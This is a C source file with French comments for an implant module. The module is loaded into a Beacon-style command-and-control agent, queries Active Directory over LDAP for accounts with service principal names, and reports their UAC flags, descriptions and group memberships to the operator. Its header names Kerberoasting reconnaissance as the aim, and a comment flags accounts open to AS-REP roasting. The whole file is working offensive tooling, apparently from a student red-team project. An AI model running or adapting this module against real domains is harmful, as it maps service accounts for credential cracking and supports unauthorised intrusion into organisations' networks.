/*
 * ============================================================
 *  mod_adspn.c — Module d'énumération des SPN AD (RDLL)
 *
 *  Port C natif du module .NET "SpnEnumerator" (équipe PFE 2026)
 *  Cible : Comptes (Utilisateurs/Ordinateurs) avec un SPN configuré.
 *  Objectif Red Team : Reconnaissance pour Kerberoasting (T1558.003).
 * ============================================================
 */
#include "beacon.h"
#include <string.h>
#include <stdio.h>
#include <windows.h>

#ifdef RDLL_MODE

#include <winldap.h>

/* ── Définition des flags UserAccountControl (les plus pertinents) ── */
typedef struct {
    int mask;
    const char *name;
} UacFlag;

static const UacFlag uac_flags[] = {
    {0x0002, "ACCOUNTDISABLE"},
    {0x0010, "LOCKOUT"},
    {0x0020, "PASSWD_NOTREQD"},
    {0x0040, "PASSWD_CANT_CHANGE"},
    {0x10000, "DONT_EXPIRE_PASSWORD"},
    {0x80000, "TRUSTED_FOR_DELEGATION"},
    {0x100000, "NOT_DELEGATED"},
    {0x400000, "DONT_REQ_PREAUTH"}, /* Critique pour AS-REP Roasting */
    {0x1000000, "TRUSTED_TO_AUTH_FOR_DELEGATION"},
    {0x04000000, "PARTIAL_SECRETS_ACCOUNT"} /* RODC */
};
#define UAC_FLAGS_COUNT (sizeof(uac_flags) / sizeof(uac_flags[0]))

/* ── Extraction d'une propriété LDAP ── */
static void ad_get_prop(PLDAP ld, PLDAPMessage entry, const char *prop, char *out, size_t outsz) {
    out[0] = '\0';
    char **vals = ldap_get_values(ld, entry, (PCHAR)prop);
    if (vals && vals[0]) {
        strncpy(out, vals[0], outsz - 1);
        out[outsz - 1] = '\0';
    }
    if (vals) ldap_value_free(vals);
}

/* ── Construction du base DN ── */
static void ad_build_base_dn(const char *domain, char *out, size_t outsz) {
    out[0] = '\0';
    const char *p = domain;
    for (;;) {
        const char *dot = strchr(p, '.');
        size_t len = dot ? (size_t)(dot - p) : strlen(p);
        if (out[0] != '\0') strncat(out, ",", outsz - strlen(out) - 1);
        strncat(out, "DC=", outsz - strlen(out) - 1);
        strncat(out, p, len);
        if (!dot) break;
        p = dot + 1;
    }
}

/* ── Décodage du masque UserAccountControl ── */
static void decode_uac(int uac_val, char *out, size_t outsz) {
    out[0] = '\0';
    int first = 1;
    for (size_t i = 0; i < UAC_FLAGS_COUNT; i++) {
        if (uac_val & uac_flags[i].mask) {
            if (!first) strncat(out, ", ", outsz - strlen(out) - 1);
            strncat(out, uac_flags[i].name, outsz - strlen(out) - 1);
            first = 0;
        }
    }
    if (first) snprintf(out, outsz, "%d", uac_val); // Fallback si aucun flag connu
}

/* ── Jointure des valeurs multi-valuées (ex: SPN) ── */
static void join_multi_value(PLDAP ld, PLDAPMessage entry, const char *prop, char *out, size_t outsz) {
    out[0] = '\0';
    char **vals = ldap_get_values(ld, entry, (PCHAR)prop);
    if (vals) {
        int first = 1;
        for (int i = 0; vals[i] != NULL; i++) {
            if (!first) strncat(out, ", ", outsz - strlen(out) - 1);
            strncat(out, vals[i], outsz - strlen(out) - 1);
            first = 0;
        }
        ldap_value_free(vals);
    }
}

/* ── Parsing du memberOf pour extraire les CN ── */
static void parse_member_of(PLDAP ld, PLDAPMessage entry, char *out, size_t outsz) {
    out[0] = '\0';
    char **vals = ldap_get_values(ld, entry, "memberOf");
    if (vals) {
        char temp_groups[2048] = {0};
        int count = 0;
        
        for (int i = 0; vals[i] != NULL && count < 50; i++) { // Limite à 50 groupes pour éviter les overflow
            const char *dn = vals[i];
            // Cherche "CN=" ou "cn=" au début
            if (strncmp(dn, "CN=", 3) == 0 || strncmp(dn, "cn=", 3) == 0) {
                const char *comma = strchr(dn + 3, ',');
                size_t len = comma ? (size_t)(comma - (dn + 3)) : strlen(dn + 3);
                
                if (len > 0 && len < 256) {
                    char cn[256] = {0};
                    strncpy(cn, dn + 3, len);
                    
                    // Gestion des virgules échappées : remplacer "\," par ","
                    char *esc = strstr(cn, "\\,");
                    while (esc) {
                        memmove(esc, esc + 1, strlen(esc)); // Décale la chaîne pour écraser le '\'
                        esc = strstr(cn, "\\,");
                    }
                    
                    if (count > 0) strncat(temp_groups, ", ", sizeof(temp_groups) - strlen(temp_groups) - 1);
                    strncat(temp_groups, cn, sizeof(temp_groups) - strlen(temp_groups) - 1);
                    count++;
                }
            }
        }
        strncpy(out, temp_groups, outsz - 1);
        ldap_value_free(vals);
    }
}

/* ── Vérifier si l'objet est un ordinateur ── */
static int is_computer(PLDAP ld, PLDAPMessage entry) {
    char **vals = ldap_get_values(ld, entry, "objectClass");
    if (vals) {
        for (int i = 0; vals[i] != NULL; i++) {
            if (_stricmp(vals[i], "computer") == 0) {
                ldap_value_free(vals);
                return 1;
            }
        }
        ldap_value_free(vals);
    }
    return 0;
}

/* ============================================================
 *  POINT D'ENTRÉE
 * ============================================================ */
BOF_DLL_EXPORT void go(char *args, int args_len) {
    (void)args; (void)args_len;

    char domain[256] = {0};
    DWORD sz = (DWORD)sizeof(domain);
    if (!GetComputerNameExA(ComputerNameDnsDomain, domain, &sz) || domain[0] == '\0') {
        BeaconPrintf(CALLBACK_ERROR, "[AD] Machine non jointe au domaine");
        return;
    }

    char base_dn[512];
    ad_build_base_dn(domain, base_dn, sizeof(base_dn));

    PLDAP ld = ldap_init((PCHAR)domain, LDAP_PORT);
    if (!ld) {
        BeaconPrintf(CALLBACK_ERROR, "[AD] ldap_init echoue");
        return;
    }

    struct l_timeval timeout = { 5, 0 };
    if (ldap_connect(ld, &timeout) != LDAP_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "[AD] Connexion LDAP echouee");
        ldap_unbind_s(ld);
        return;
    }

    if (ldap_bind_s(ld, NULL, NULL, LDAP_AUTH_NEGOTIATE) != LDAP_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "[AD] Echec de l'authentification LDAP (bind)");
        ldap_unbind_s(ld);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "Domaine      : %s\n", domain);

    /* ── Requête : Tous les objets avec un SPN (Utilisateurs ou Ordinateurs) ── */
    const char *filter = "(&(servicePrincipalName=*)(|(objectClass=user)(objectClass=computer)))";
    char *attrs[] = {
        "name", "sAMAccountName", "userPrincipalName", "dNSHostName",
        "description", "servicePrincipalName", "userAccountControl",
        "memberOf", "objectClass", NULL
    };

    PLDAPMessage msg = NULL;
    if (ldap_search_s(ld, (PCHAR)base_dn, LDAP_SCOPE_SUBTREE, (PCHAR)filter, attrs, 0, &msg) != LDAP_SUCCESS || !msg) {
        BeaconPrintf(CALLBACK_ERROR, "[AD] Requete SPN echouee");
        ldap_unbind_s(ld);
        return;
    }

    int count = 0;
    PLDAPMessage entry;
    for (entry = ldap_first_entry(ld, msg); entry; entry = ldap_next_entry(ld, entry)) {
        char name[256], sam[256], upn[256], dns[256], desc[512];
        char spn_str[2048] = {0}, uac_str[512] = {0}, groups_str[2048] = {0};

        ad_get_prop(ld, entry, "name", name, sizeof(name));
        ad_get_prop(ld, entry, "sAMAccountName", sam, sizeof(sam));
        ad_get_prop(ld, entry, "userPrincipalName", upn, sizeof(upn));
        ad_get_prop(ld, entry, "dNSHostName", dns, sizeof(dns));
        ad_get_prop(ld, entry, "description", desc, sizeof(desc));

        int is_comp = is_computer(ld, entry);
        
        // Décodage UAC
        char uac_raw[64] = {0};
        ad_get_prop(ld, entry, "userAccountControl", uac_raw, sizeof(uac_raw));
        if (uac_raw[0] != '\0') {
            decode_uac(atoi(uac_raw), uac_str, sizeof(uac_str));
        }

        // Récupération des données spécifiques
        join_multi_value(ld, entry, "servicePrincipalName", spn_str, sizeof(spn_str));
        parse_member_of(ld, entry, groups_str, sizeof(groups_str));

        count++;
        BeaconPrintf(CALLBACK_OUTPUT, "[%d] %s (%s)", count, name[0] ? name : sam, sam[0] ? sam : "?");
        BeaconPrintf(CALLBACK_OUTPUT, "     Type         : %s", is_comp ? "Computer" : "User");
        BeaconPrintf(CALLBACK_OUTPUT, "     Identity     : %s", is_comp ? (dns[0] ? dns : "N/A") : (upn[0] ? upn : "N/A"));
        
        if (desc[0] != '\0') {
            BeaconPrintf(CALLBACK_OUTPUT, "     Description  : %s", desc);
        }
        
        BeaconPrintf(CALLBACK_OUTPUT, "     SPNs         : %s", spn_str[0] ? spn_str : "None");
        BeaconPrintf(CALLBACK_OUTPUT, "     UAC Flags    : %s", uac_str);
        BeaconPrintf(CALLBACK_OUTPUT, "     Member Of    : %s\n", groups_str[0] ? groups_str : "None");
    }

    BeaconPrintf(CALLBACK_OUTPUT, "────────────────────────────────────────\nTotal        : %d compte(s) avec SPN\n", count);

    ldap_msgfree(msg);
    ldap_unbind_s(ld);
}

#else

BOF_DLL_EXPORT void go(char *args, int args_len) {
    (void)args; (void)args_len;
    BeaconPrintf(CALLBACK_ERROR, "[adspn] Mode BOF non supporté — utilisez -t rdll");
}

#endif /* RDLL_MODE */